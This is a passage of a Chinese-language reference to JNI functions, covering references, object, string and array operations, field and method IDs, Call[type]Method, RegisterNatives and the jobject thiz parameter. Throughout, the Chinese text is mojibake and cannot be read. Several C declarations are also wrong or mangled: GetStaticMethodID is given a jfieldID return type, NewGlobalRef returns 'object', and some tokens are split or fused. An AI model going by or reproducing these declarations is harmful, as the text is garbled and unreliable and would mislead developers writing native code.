é™¤ globalRef æ‰€æŒ‡å‘çš„å…¨å±€å¼•ç”¨ /*@param globalRef: å…¨å±€å¼•ç”¨*/ void DeleteGlobalRef (JNIEnv *env, jobject globalRef);# NewGlobalRef åˆ›å»º obj å‚æ•°æ‰€å¼•ç”¨å¯¹è±¡çš„æ–°å…¨å±€å¼•ç”¨ï¼Œåˆ›å»ºçš„å¼•ç”¨è¦é€šè¿‡è°ƒç”¨ DeleteGlobalRef () æ¥æ˜¾å¼æ’¤æ¶ˆ /*@param obj: å…¨å±€æˆ–å±€éƒ¨å¼•ç”¨@return: è¿”å›å…¨å±€å¼•ç”¨ï¼Œå¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³åˆ™è¿”å› NULL*/object NewGlobalRef (JNIEnv *env, jobject obj);# å¯¹è±¡æ“ä½œ # IsSameObject æµ‹è¯•ä¸¤ä¸ªå¼•ç”¨æ˜¯å¦å¼•ç”¨åŒä¸€ Java å¯¹è±¡ /*@param ref1: java å¯¹è±¡@param ref2: java å¯¹è±¡@return: å¦‚æœ ref1 å’Œ ref2 å¼•ç”¨åŒä¸€ Java å¯¹è±¡æˆ–å‡ä¸º NULLï¼Œåˆ™è¿”å› JNI_TRUEã€‚å¦åˆ™è¿”å› JNI_FALSE*/ jboolean IsSameObject (JNIEnv *env, jobject ref1, jobject ref2);# IsInstanceOf æµ‹è¯•å¯¹è±¡æ˜¯å¦ä¸ºæŸä¸ªç±»çš„å®ä¾‹ /*@param obj: Java å¯¹è±¡@param clazz: Java ç±»å¯¹è±¡@return: å¦‚æœå¯å°† obj å¼ºåˆ¶è½¬æ¢ä¸º clazzï¼Œåˆ™è¿”å› JNI_TRUEã€‚å¦åˆ™è¿”å› JNI_FALSEã€‚NULL å¯¹è±¡å¯å¼ºåˆ¶è½¬æ¢ä¸ºä»»ä½•ç±»*/ jboolean IsInstanceOf (JNIEnv *env, jobject obj, jclass clazz);# GetObjectClass è¿”å›å¯¹è±¡çš„ç±» /*@param obj: Java å¯¹è±¡ï¼ˆä¸èƒ½ä¸º NULLï¼‰@return: Java ç±»å¯¹è±¡*/ jclass GetObjectClass (JNIEnv *env, jobject obj);# NewObject æ„é€ æ–° Java å¯¹è±¡ã€‚æ–¹æ³• methodId æŒ‡å‘åº”è°ƒç”¨çš„æ„é€ å‡½æ•°æ–¹æ³•ã€‚æ³¨æ„ï¼šè¯¥ ID ç‰¹æŒ‡è¯¥ç±» class çš„æ„é€ å‡½æ•° IDï¼Œå¿…é¡»é€šè¿‡è°ƒç”¨ GetMethodID () è·å¾—ï¼Œä¸”è°ƒç”¨æ—¶çš„æ–¹æ³•åå¿…é¡»ä¸º &lt;init&gt; ï¼Œè€Œè¿”å›ç±»å‹å¿…é¡»ä¸º void (V)ï¼Œclazz å‚æ•°åŠ¡å¿…ä¸è¦å¼•ç”¨æ•°ç»„ç±»ã€‚ /*@return: è¿”å› Java å¯¹è±¡ï¼Œå¦‚æœæ— æ³•æ„é€ è¯¥å¯¹è±¡ï¼Œåˆ™è¿”å› NULL@throw: InstantiationException å¦‚æœè¯¥ç±»ä¸ºæ¥å£æˆ–æŠ½è±¡ç±» OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jobject NewObject (JNIEnv *env , jclass clazz, jmethodID methodID, ...); // å‚æ•°é™„åŠ åœ¨å‡½æ•°åé¢jobject NewObjectA (JNIEnv *env , jclassclazz, jmethodID methodID, jvalue *args); // å‚æ•°ä»¥æŒ‡é’ˆå½¢å¼é™„åŠ  jobjec tNewObjectV (JNIEnv *env , jclassclazz, jmethodID methodID, va_list args); // å‚æ•°ä»¥ \"é“¾è¡¨\" å½¢å¼é™„åŠ # AllocObject åˆ†é…æ–° Java å¯¹è±¡è€Œä¸è°ƒç”¨è¯¥å¯¹è±¡çš„ä»»ä½•æ„é€ å‡½æ•°ï¼Œè¿”å›è¯¥å¯¹è±¡çš„å¼•ç”¨ï¼›clazz å‚æ•°åŠ¡å¿…ä¸è¦å¼•ç”¨æ•°ç»„ç±»ã€‚ /*@param clazz: Java ç±»å¯¹è±¡@return: è¿”å› Java å¯¹è±¡ï¼›å¦‚æœæ— æ³•æ„é€ è¯¥å¯¹è±¡ï¼Œåˆ™è¿”å› NULL@throw: InstantiationExceptionï¼šå¦‚æœè¯¥ç±»ä¸ºä¸€ä¸ªæ¥å£æˆ–æŠ½è±¡ç±» OutOfMemoryErrorï¼šå¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jobject AllocObject (JNIEnv *env, jclass clazz);# å­—ç¬¦ä¸²æ“ä½œ # Get/ReleaseStringCritical è¿™ä¸¤ä¸ªå‡½æ•°çš„è¯­ä¹‰ä¸ Get/ReleaseStringChars å‡½æ•°ç±»ä¼¼ï¼Œä½† VM ä¼šå°½é‡è¿”å›ä¸€ä¸ªæŒ‡é’ˆã€‚ä½†æ˜¯ä½¿ç”¨è¿™ä¸€å¯¹å‡½æ•°æ—¶å¿…é¡»æœ‰ä¸¥æ ¼é™åˆ¶ï¼šåœ¨è¿™å¯¹å‡½æ•°è°ƒç”¨ä¹‹é—´ç»å¯¹ä¸èƒ½è°ƒç”¨å…¶ä»– JNI æ–¹æ³•ï¼Œå¦åˆ™å°†å¯¼è‡´å½“å‰çº¿ç¨‹é˜»å¡ã€‚ const jchar * GetStringCritical(JNIEnv *env, jstring string, jboolean *isCopy);void ReleaseStringCritical(JNIEnv *env, jstring string, const jchar *carray);# GetStringUTFRegion å°† str åç§»ä½ç½® start å¼€å§‹çš„ len é•¿åº¦ unicode å­—ç¬¦è½¬æ¢ä¸º C char å­—ç¬¦ï¼Œå¹¶æ”¾åœ¨ buf ä¸­ void GetStringUTFRegion(JNIEnv *env, jstring str, jsize start, jsize len, char *buf);# GetStringRegion ä» str çš„åç§»ä½ç½® start å¼€å§‹ï¼Œå¤åˆ¶ len é•¿åº¦çš„ unicode å­—ç¬¦åˆ° buf ä¸­ void GetStringRegion(JNIEnv *env, jstring str, jsize start, jsize len, jchar *buf);# ReleaseStringUTFChars é€šçŸ¥æœ¬åœ°ä»£ç ä¸è¦å†è®¿é—® utfã€‚utf å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯åˆ©ç”¨ GetStringUTFChars () è·å¾— /*@param string: Java å­—ç¬¦ä¸²å¯¹è±¡@param utf: æŒ‡å‘ UTF-8 å­—ç¬¦ä¸²çš„æŒ‡é’ˆ*/ void ReleaseStringUTFChars (JNIEnv *env, jstring string, const char *utf);# GetStringUTFChars è¿”å›æŒ‡å‘å­—ç¬¦ä¸²çš„ UTF-8 å­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆã€‚è¯¥æ•°ç»„åœ¨è¢« ReleaseStringUTFChars () é‡Šæ”¾å‰å°†ä¸€ç›´æœ‰æ•ˆã€‚ å¦‚æœ isCopy ä¸æ˜¯ NULLï¼Œ*isCopy åœ¨å¤åˆ¶å®Œæˆåå³è¢«è®¾ä¸º JNI_TRUEã€‚å¦‚æœæœªå¤åˆ¶ï¼Œåˆ™è®¾ä¸º JNI_FALSEã€‚ /*@param string: Java å­—ç¬¦ä¸²å¯¹è±¡@param isCopy: æŒ‡å‘å¸ƒå°”å€¼çš„æŒ‡é’ˆ@return: æŒ‡å‘ UTF-8 å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™ä¸º NULL*/ const char* GetStringUTFChars (JNIEnv*env, jstring string, jboolean *isCopy);# GetStringUTFLength ä»¥å­—èŠ‚ä¸ºå•ä½è¿”å›å­—ç¬¦ä¸²çš„ UTF-8 é•¿åº¦ /*@param string: Java å­—ç¬¦ä¸²å¯¹è±¡@return: è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦*/ jsize GetStringUTFLength (JNIEnv *env, jstring string);# NewStringUTF åˆ©ç”¨ UTF-8 å­—ç¬¦æ•°ç»„æ„é€ æ–° java.lang.String å¯¹è±¡ /*@param bytes: æŒ‡å‘ UTF-8 å­—ç¬¦ä¸²çš„æŒ‡é’ˆ@return: Java å­—ç¬¦ä¸²å¯¹è±¡ã€‚å¦‚æœæ— æ³•æ„é€ è¯¥å­—ç¬¦ä¸²ï¼Œåˆ™ä¸º NULL@throw: OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/ jstring NewStringUTF (JNIEnv *env, const char *bytes);# ReleaseStringChars é€šçŸ¥æœ¬åœ°ä»£ç ä¸è¦å†è®¿é—® charsã€‚å‚æ•° chars æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯é€šè¿‡ GetStringChars () ä» string è·å¾— /*@param chars: æŒ‡å‘ Unicode å­—ç¬¦ä¸²çš„æŒ‡é’ˆ*/ void ReleaseStringChars(JNIEnv *env, jstring string, const jchar *chars);# GetStringChars è¿”å›æŒ‡å‘å­—ç¬¦ä¸²çš„ Unicode å­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆã€‚è¯¥æŒ‡é’ˆåœ¨è°ƒç”¨ ReleaseStringchars () å‰ä¸€ç›´æœ‰æ•ˆã€‚å¦‚æœ isCopy éç©ºï¼Œåˆ™åœ¨å¤åˆ¶å®Œæˆåå°† *isCopy è®¾ä¸º JNI_TRUEã€‚å¦‚æœæ²¡æœ‰å¤åˆ¶ï¼Œåˆ™è®¾ä¸º JNI_FALSE /*@param string: Java å­—ç¬¦ä¸²å¯¹è±¡@param isCopy: æŒ‡å‘å¸ƒå°”å€¼çš„æŒ‡é’ˆ@return: æŒ‡å‘ Unicode å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œå¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™è¿”å› NULL*/const jchar * GetStringChars(JNIEnv*env, jstring string, jboolean *isCopy);# GetStringLength è¿”å› Java å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆUnicode å­—ç¬¦æ•°ï¼‰ /*@param string: Java å­—ç¬¦ä¸²å¯¹è±¡@return: Java å­—ç¬¦ä¸²çš„é•¿åº¦*/jsize GetStringLength (JNIEnv *env, jstring string);# NewString åˆ©ç”¨ Unicode å­—ç¬¦æ•°ç»„æ„é€ æ–°çš„ java.lang.String å¯¹è±¡ /*@param unicodeChars: æŒ‡å‘ Unicode å­—ç¬¦ä¸²çš„æŒ‡é’ˆ@param len: Unicode å­—ç¬¦ä¸²çš„é•¿åº¦@return Java å­—ç¬¦ä¸²å¯¹è±¡ã€‚å¦‚æœæ— æ³•æ„é€ è¯¥å­—ç¬¦ä¸²ï¼Œåˆ™ä¸º NULL.@throw OutOfMemoryErrorï¼šå¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jstring NewString (JNIEnv *env, const jchar *unicodeChars, jsize len);# æ•°ç»„æ“ä½œ # SetObjectArrayElement è®¾ç½® Object æ•°ç»„çš„å…ƒç´  /*@param array: Java æ•°ç»„@param index: å…ƒç´ ç´¢å¼•@param value: æ–°çš„å¯¹è±¡@throw: ArrayIndexOutOfBoundsException å¦‚æœ index ä¸æ˜¯æ•°ç»„ä¸­çš„æœ‰æ•ˆä¸‹æ ‡ ArrayStoreException å¦‚æœ value çš„ç±»ä¸æ˜¯æ•°ç»„å…ƒç´ ç±»çš„å­ç±»*/ void SetObjectArrayElement (JNIEnv *env, jobjectArray array, jsize index, jobject value);# GetObjectArrayElement è¿”å› Object æ•°ç»„çš„å…ƒç´  /*@param array: Java æ•°ç»„@param index: å…ƒç´ ç´¢å¼•@return: Java å¯¹è±¡@throw: ArrayIndexOutOfBoundsException å¦‚æœ index ä¸æ˜¯æ•°ç»„ä¸­çš„æœ‰æ•ˆä¸‹æ ‡*/ jobject GetObjectArrayElement (JNIEnv *env, jobjectArray array, jsize index);# NewObjectArray æ„é€ æ–°çš„æ•°ç»„ï¼Œå®ƒå°†ä¿å­˜ç±» elementClass ä¸­çš„å¯¹è±¡ã€‚æ‰€æœ‰å…ƒç´ åˆå§‹å€¼å‡è®¾ä¸º initialElement /*@param length: æ•°ç»„å¤§å°@param elementClass: æ•°ç»„å…ƒç´ ç±»å¯¹è±¡@return: initialElement åˆå§‹å€¼ï¼Œå¯ä»¥ä¸º NULL@throw: OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jarray NewObjectArray(JNIEnv *env, jsize length, jclass elementClass, jobject initialElement);# GetArrayLength è¿”å›æ•°ç»„ä¸­çš„å…ƒç´ æ•° /*@param array: Java æ•°ç»„å¯¹è±¡@return: æ•°ç»„çš„é•¿åº¦*/jsize GetArrayLength (JNIEnv *env, jarray array);# New[PrimitiveType]Array Routines ç”¨äºæ„é€ åŸºæœ¬ç±»å‹æ•°ç»„å¯¹è±¡ /*@param length: è¦æ„é€ çš„æ•°ç»„çš„é•¿åº¦@return Java æ•°ç»„ã€‚å¦‚æœæ— æ³•æ„é€ è¯¥æ•°ç»„ï¼Œåˆ™ä¸º NULL*/ArrayType New[PrimitiveType]Array(JNIEnv *env, jsize length);ä¸‹è¡¨è¯´æ˜äº†ç‰¹å®šçš„åŸºæœ¬ç±»å‹æ•°ç»„æ„é€ å‡½æ•°ã€‚ç”¨æˆ·åº”æŠŠ New [PrimitiveType] Array æ›¿æ¢ä¸ºæŸä¸ªå®é™…çš„åŸºæœ¬ç±»å‹æ•°ç»„æ„é€ å‡½æ•°ä¾‹ç¨‹åï¼Œç„¶åå°† ArrayType æ›¿æ¢ä¸ºè¯¥ä¾‹ç¨‹ç›¸åº”çš„æ•°ç»„ç±»å‹: New[PrimitiveType]Array ArrayType NewBooleanArray() jbooleanarray NewByteArray() jbytearray NewCharArray() jchararray NewShortArray() jshortarray NewIntArray() jintarray NewLongArray() jlongarray NewFloatArray() jfloatarray NewDoubleArray() jdoublearray # Get[PrimitiveType]ArrayElements ä¸€ç»„è¿”å›åŸºæœ¬ç±»å‹æ•°ç»„ä½“çš„å‡½æ•°ã€‚ç»“æœåœ¨è°ƒç”¨ç›¸åº”çš„ Release [PrimitiveType] ArrayElements () å‡½æ•°å‰å°†ä¸€ç›´æœ‰æ•ˆã€‚ç”±äºè¿”å›çš„æ•°ç»„å¯èƒ½æ˜¯ Java æ•°ç»„çš„å‰¯æœ¬ï¼Œå› æ­¤å¯¹è¿”å›æ•°ç»„çš„æ›´æ”¹ä¸å¿…åœ¨åŸºæœ¬ç±»å‹æ•°ç»„ä¸­åæ˜ å‡ºæ¥ï¼Œç›´åˆ°è°ƒç”¨äº† Release [PrimitiveType] ArrayElements ()ã€‚ /*@param array: Java å¯¹è±¡æ•°ç»„@param isCopy: å¦‚æœ isCopy ä¸æ˜¯ NULLï¼Œ*isCopy åœ¨å¤åˆ¶å®Œæˆåå³è¢«è®¾ä¸º JNI_TRUE; å¦‚æœæœªå¤åˆ¶ï¼Œåˆ™è®¾ä¸º JNI_FALSE@return: è¿”å›æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆï¼Œå¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™ä¸º NULL*/NativeType * Get[PrimitiveType]ArrayElements (JNIEnv *env, ArrayType array, jboolean *isCopy); Get[PrimitiveType]ArrayElements NativeType ArrayType GetBooleanArrayElements() jboolean jbooleanArray GetByteArrayElements() jbyte jbyteArray GetCharArrayElements() jchar jcharArray GetShortArrayElements() jshort jshortArray GetIntArrayElements() jint jintArray GetLongArrayElements() jlong jlongArray GetFloatArrayElements() jfloat jfloatArray GetDoubleArrayElements() jdouble jdoubleArray # Release[PrimitiveType]ArrayElements é‡Šæ”¾ elemsï¼Œé€šçŸ¥æœ¬åœ°ä»£ç ä¸è¦å†è®¿é—® elems /*@param array: Java æ•°ç»„å¯¹è±¡@param elems: å‚æ•°æ˜¯ä¸€ä¸ªé€šè¿‡ä½¿ç”¨å¯¹åº”çš„ Get [PrimitiveType] ArrayElements () å‡½æ•°ç”± array å¯¼å‡ºçš„æŒ‡é’ˆã€‚@param mode: é‡Šæ”¾æ¨¡å¼ï¼Œmode å‚æ•°å°†æä¾›æœ‰å…³å¦‚ä½•é‡Šæ”¾æ•°ç»„ç¼“å†²åŒºçš„ä¿¡æ¯ã€‚å¦‚æœ elems ä¸æ˜¯ array ä¸­æ•°ç»„å…ƒç´ çš„å‰¯æœ¬ï¼Œmode å°†æ— æ•ˆï¼›å¦åˆ™ï¼Œmode å°†å…·æœ‰ä¸‹è¡¨æ‰€è¿°çš„åŠŸèƒ½: 0 å¤åˆ¶å›å†…å®¹å¹¶é‡Šæ”¾ elems ç¼“å†²åŒº JNI_COMMIT å¤åˆ¶å›å†…å®¹ä½†ä¸é‡Šæ”¾ elems ç¼“å†²åŒº JNI_ABORT é‡Šæ”¾ç¼“å†²åŒºä½†ä¸å¤åˆ¶å›å˜åŒ–*/ void Release[PrimitiveType]ArrayElements (JNIEnv *env, ArrayType array, NativeType *elems, jint mode);Release [PrimitiveType] ArrayElements æƒ¯ç”¨æ³•é‡Œçš„ç±»å‹å‚æ•°ä¸ Get [PrimitiveType] ArrayElements å¯¹åº”ï¼Œä¸å†åˆ—å‡º # Get[PrimitiveType]ArrayRegion å°†åŸºæœ¬ç±»å‹æ•°ç»„æŸä¸€åŒºåŸŸå¤åˆ¶åˆ°ç¼“å†²åŒºä¸­çš„ä¸€ç»„å‡½æ•°ï¼Œä½¿ç”¨æ—¶æ›¿æ¢ PrimitiveTypeï¼Œ ArrayTypeï¼Œå’Œ NativeTypeï¼Œå¦‚ GetBooleanArrayRegion () ï¼ŒjbooleanArray å’Œ jboolean /*@param array: Java æ•°ç»„ @param start: èµ·å§‹ä½ç½®@param len: è¦å¤åˆ¶çš„é•¿åº¦@param buf: ç›®æ ‡ç¼“å†²åŒº@throw: ArrayIndexOutOfBoundsException å¦‚æœåŒºåŸŸä¸­çš„æŸä¸ªä¸‹æ ‡æ— æ•ˆ*/void Get[PrimitiveType]ArrayRegion (JNIEnv *env, ArrayType array, jsize start, jsize len, NativeType *buf);# Set[PrimitiveType]ArrayRegion å°†åŸºæœ¬ç±»å‹æ•°ç»„çš„æŸä¸€åŒºåŸŸä»ç¼“å†²åŒºä¸­å¤åˆ¶å›æ¥çš„ä¸€ç»„å‡½æ•°ï¼Œä½¿ç”¨æ—¶æ›¿æ¢ PrimitiveTypeï¼Œ ArrayTypeï¼Œå’Œ NativeTypeï¼Œå¦‚ SetBooleanArrayRegion () ï¼ŒjbooleanArray å’Œ jboolean /*@param array: Java æ•°ç»„@param start: èµ·å§‹ä½ç½®@param len: å†™å›çš„é•¿åº¦@param buf: æºç¼“å†²åŒº@throw: ArrayIndexOutOfBoundsExceptionï¼šå¦‚æœåŒºåŸŸä¸­çš„æŸä¸ªä¸‹æ ‡æ— æ•ˆ*/ void Set[PrimitiveType]ArrayRegion (JNIEnv *env, ArrayType array, jsize start, jsize len, NativeType *buf);# GetPrimitiveArrayCritical ä¸ ReleasePrimitiveArrayCritical ä½œç”¨åŒ Get/Release [PrimitiveType] ArrayElements ç›¸åŒï¼Œä½†æ˜¯ VM å°½å¯èƒ½è¿”å›åŸ java æ•°ç»„çš„æŒ‡é’ˆï¼Œå¦åˆ™è¿”å›ä¸€ä»½æ‹·è´ã€‚ è¿™ä¸¤ç»„è°ƒç”¨ä¹‹é—´ä¸èƒ½è°ƒç”¨å…¶ä»– JNI å‡½æ•°æˆ–è¿›è¡Œå…¶ä»–ç³»ç»Ÿè°ƒç”¨ï¼Œå¦åˆ™ä¼šå¯¼è‡´çº¿ç¨‹é˜»å¡ã€‚ void * GetPrimitiveArrayCritical(JNIEnv *env, jarray array, jboolean *isCopy);void ReleasePrimitiveArrayCritical(JNIEnv *env, jarray array, void *carray, jint mode);# è®¿é—®å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³• # GetStaticMethodID è·å–ç±»å¯¹è±¡çš„é™æ€æ–¹æ³• ID jfieldID GetStaticMethodID(JNIEnv *env, jclass clazz, const char *name, const char *sig);# GetFieldID è¿”å› Java ç±»ï¼ˆéé™æ€ï¼‰åŸŸçš„å±æ€§ IDã€‚è¯¥åŸŸç”±å…¶åç§°åŠç­¾åæŒ‡å®šã€‚è®¿é—®å™¨å‡½æ•°çš„ Get [type] Field åŠ Set [type] Field ç³»åˆ—ä½¿ç”¨åŸŸ ID æ£€ç´¢å¯¹è±¡åŸŸã€‚GetFieldID () ä¸èƒ½ç”¨äºè·å–æ•°ç»„çš„é•¿åº¦åŸŸã€‚åº”ä½¿ç”¨ GetArrayLength ()ã€‚ /*@param clazz: Java ç±»å¯¹è±¡@param name: è¯¥å±æ€§çš„ Name åç§°@param sig: è¯¥å±æ€§çš„åŸŸç­¾å@return: å±æ€§ ID å¯¹è±¡ã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™è¿”å› NULL@throw: NoSuchFieldError å¦‚æœæ‰¾ä¸åˆ°æŒ‡å®šçš„åŸŸ ExceptionInInitializerError å¦‚æœç”±äºå¼‚å¸¸è€Œå¯¼è‡´ç±»åˆå§‹åŒ–ç¨‹åºå¤±è´¥ OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jfieldID GetFieldID (JNIEnv *env, jclass clazz, const char *name, const char *sig);# GetMethodID è¿”å›ç±»æˆ–æ¥å£å®ä¾‹ï¼ˆéé™æ€ï¼‰æ–¹æ³•çš„æ–¹æ³• IDã€‚æ–¹æ³•å¯åœ¨æŸä¸ª clazz çš„è¶…ç±»ä¸­å®šä¹‰ï¼Œä¹Ÿå¯ä» clazz ç»§æ‰¿ã€‚è¯¥æ–¹æ³•ç”±å…¶åç§°å’Œç­¾åå†³å®šã€‚ GetMethodID () å¯ä½¿æœªåˆå§‹åŒ–çš„ç±»åˆå§‹åŒ–ã€‚è¦è·å¾—æ„é€ å‡½æ•°çš„æ–¹æ³• IDï¼Œåº”å°† &lt;init&gt; ä½œä¸ºæ–¹æ³•åï¼ŒåŒæ—¶å°† void (V) ä½œä¸ºè¿”å›ç±»å‹ /*@param clazz: Java ç±»å¯¹è±¡@param name: è¯¥æ–¹æ³•çš„ Name åç§°@param sig: è¯¥æ–¹æ³•å‚æ•°å’Œè¿”å›å€¼åŸŸç­¾å *@return: æ–¹æ³• IDï¼Œå¦‚æœæ‰¾ä¸åˆ°æŒ‡å®šçš„æ–¹æ³•ï¼Œåˆ™ä¸º NULL@throw: NoSuchMethodError å¦‚æœæ‰¾ä¸åˆ°æŒ‡å®šæ–¹æ³• ExceptionInInitializerError å¦‚æœç”±äºå¼‚å¸¸è€Œå¯¼è‡´ç±»åˆå§‹åŒ–ç¨‹åºå¤±è´¥ OutOfMemoryError å¦‚æœç³»ç»Ÿå†…å­˜ä¸è¶³*/jmethodID GetMethodID(JNIEnv *env, jclass clazz, const char *name, const char *sig);# GetStaticFieldID è·å–ç±»çš„é™æ€åŸŸ ID æ–¹æ³• jfieldID GetStaticFieldID (JNIEnv *env,jclass clazz, const char *name, const char *sig);# Get[type]Field è¯¥ä¾‹ç¨‹ç³»åˆ—è¿”å›å¯¹è±¡çš„å®ä¾‹ï¼ˆéé™æ€ï¼‰åŸŸçš„å€¼ã€‚è¦è®¿é—®çš„åŸŸç”±é€šè¿‡è°ƒç”¨ GetFieldID () è€Œå¾—åˆ°çš„åŸŸ ID æŒ‡å®šã€‚ /*@param obj: Java å¯¹è±¡ï¼ˆä¸èƒ½ä¸º NULLï¼‰@param fieldID: æœ‰æ•ˆçš„åŸŸ ID@return: å±æ€§çš„å†…å®¹*/NativeType Get[type]Field (JNIEnv*env, jobject obj, jfieldID fieldID); // è·å–ç±»å¯¹è±¡é™æ€åŸŸçš„å€¼NativeType GetStatic[type]Field (JNIEnv*env, jclass classzz, jfieldID fieldID); Get[type]Field NativeType GetObjectField() jobject GetBooleanField() jboolean GetByteField() jbyte GetCharField() jchar GetShortField() jshort GetIntField() jint GetLongField() jlong GetFloatField() jfloat GetDoubleField() jdouble # Set[type]Field è¯¥æƒ¯ç”¨æ³•è®¾ç½®å¯¹è±¡çš„å®ä¾‹ï¼ˆéé™æ€ï¼‰å±æ€§çš„å€¼ã€‚è¦è®¿é—®çš„å±æ€§ç”±é€šè¿‡è°ƒç”¨ SetFieldID () è€Œå¾—åˆ°çš„å±æ€§ ID æŒ‡å®šã€‚ /*@param obj: Java å¯¹è±¡ï¼ˆä¸èƒ½ä¸º NULLï¼‰@param fieldId: æœ‰æ•ˆçš„åŸŸ ID@param value: åŸŸçš„æ–°å€¼*/void Set[type]Field (JNIEnv *env, jobject obj, jfieldID fieldID, NativeType value);// è®¾ç½®ç±»çš„é™æ€åŸŸçš„å€¼void SetStatic[type]Field (JNIEnv *env, jclass classzz, jfieldID fieldID, NativeType value); Set[type]Field NativeType SetObjectField() jobject SetBooleanField() jboolean SetByteField() jbyte SetCharField() jchar SetShortField() jshort SetIntField() jint SetLongField() jlong SetFloatField() jfloat SetDoubleField() jdouble # Call[type]Method è¿™ä¸‰ä¸ªæ“ä½œçš„æ–¹æ³•ç”¨äºä»æœ¬åœ°æ–¹æ³•è°ƒç”¨ Java å®ä¾‹æ–¹æ³•ã€‚å®ƒä»¬çš„å·®åˆ«ä»…åœ¨äºå‘å…¶æ‰€è°ƒç”¨çš„æ–¹æ³•ä¼ é€’å‚æ•°æ—¶æ‰€ç”¨çš„æœºåˆ¶ã€‚ è¿™ä¸‰ä¸ªæ“ä½œå°†æ ¹æ®æ‰€æŒ‡å®šçš„ methodID è°ƒç”¨ Java å¯¹è±¡çš„å®ä¾‹ï¼ˆéé™æ€ï¼‰æ–¹æ³•ã€‚å‚æ•° methodID å¿…é¡»é€šè¿‡è°ƒç”¨ GetMethodID () æ¥è·å¾—ã€‚å½“è¿™äº›å‡½æ•°ç”¨äºè°ƒç”¨ç§æœ‰æ–¹æ³•å’Œæ„é€ å‡½æ•°æ—¶ï¼ŒmethodID å¿…é¡»ä» obj çš„çœŸå®ç±»æ´¾ç”Ÿè€Œæ¥ï¼Œè€Œä¸åº”ä»å…¶æŸä¸ªè¶…ç±»æ´¾ç”Ÿã€‚å½“ç„¶ï¼Œé™„åŠ å‚æ•°å¯ä»¥ä¸ºç©º ã€‚ /*@param obj Java å¯¹è±¡@param methodId æ–¹æ³• ID*/NativeType Call[type]Method (JNIEnv *env, jobject obj, jmethodID methodID, ...); // å‚æ•°é™„åŠ åœ¨å‡½æ•°åé¢ï¼ŒNativeType Call[type]MethodA (JNIEnv *env, jobject obj, jmethodID methodID, jvalue *args); // å‚æ•°ä»¥æŒ‡é’ˆå½¢å¼é™„åŠ NativeType Call[type]MethodV (JNIEnv *env, jobject obj,jmethodID methodID, va_list args); // å‚æ•°ä»¥ \"é“¾è¡¨\" å½¢å¼é™„åŠ  Call[type]Method&lt;A/V&gt; NativeType CallVoidMethod() æ—  CallObjectMethod() jobect CallBooleanMethod () jboolean CallByteMethod() jbyte CallCharMethod() jchar CallShortMethod() jshort CallIntMethod() jint CallLongMethod() jlong CallFloatMethod() jfloat CallDoubleMethod() jdouble # æ³¨å†Œæœ¬åœ°æ–¹æ³• # RegisterNatives å‘ clazz å‚æ•°æŒ‡å®šçš„ç±»æ³¨å†Œæœ¬åœ°æ–¹æ³•ã€‚ /**@param clazz: ç›®æ ‡ç±»å¯¹è±¡@param methods: JNINativeMethod ç»“æ„æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«æœ¬åœ°æ–¹æ³•çš„åç§°ã€ç­¾åå’Œå‡½æ•°æŒ‡é’ˆ@param nMethods: methods å‚æ•°çš„é•¿åº¦@return: æˆåŠŸæ—¶è¿”å› 0ï¼›å¤±è´¥æ—¶è¿”å›è´Ÿæ•°@throw: NoSuchMethodError å¦‚æœæ‰¾ä¸åˆ°æŒ‡å®šçš„æ–¹æ³•æˆ–æ–¹æ³•ä¸æ˜¯æœ¬åœ°æ–¹æ³•*/jint RegisterNatives(JNIEnv *env, jclass clazz, const JNINativeMethod *methods, jint nMethods);methods JNINativeMethod å®šä¹‰å¦‚ä¸‹ï¼š typedef struct &#123; char *name; char *signature; void *fnPtr; &#125; JNINativeMethod; # UnregisterNatives åæ³¨å†Œç±»çš„æœ¬åœ°æ–¹æ³•ã€‚ç±»å°†è¿”å›åˆ°é“¾æ¥æˆ–æ³¨å†Œäº†æœ¬åœ°æ–¹æ³•å‡½æ•°å‰çš„çŠ¶æ€ã€‚è¯¥å‡½æ•°ä¸åº”åœ¨æœ¬åœ°ä»£ç ä¸­ä½¿ç”¨ã€‚ç›¸åï¼Œå®ƒå¯ä»¥ä¸ºæŸäº›ç¨‹åºæä¾›ä¸€ç§é‡æ–°åŠ è½½å’Œé‡æ–°é“¾æ¥æœ¬åœ°åº“çš„é€”å¾„ã€‚ /*@param clazz: Java ç±»å¯¹è±¡@throw: æˆåŠŸæ—¶è¿”å› 0ï¼›å¤±è´¥æ—¶è¿”å›è´Ÿæ•°*/jint UnregisterNatives (JNIEnv *env, jclass clazz);# jobject thiz å½“æˆ‘ä»¬åœ¨ native ä¸­æ³¨å†Œä¸€ä¸ª java å‡½æ•°åï¼Œä¸€èˆ¬å¯ä»¥çœ‹åˆ°å‡½æ•°çš„å£°æ˜éƒ½åƒä¸‹é¢è¿™ä¸ªæ ·å­ Java_com_oacia_loadso_MainActivity_hello(JNIEnv *env, jobject thiz) &#123; // TODO: implement hello()&#125;é‚£ä¹ˆå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° jobject thiz æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ æˆ‘ä»¬ä¸å¦¨çœ‹ä¸€çœ‹ android studio ç»™æˆ‘ä»¬çš„ä»£ç æç¤º è¿™ä¸ª thiz æŒ‡å‘çš„æ˜¯ native å‡½æ•°å£°æ˜æ‰€åœ¨çš„ç±» demo 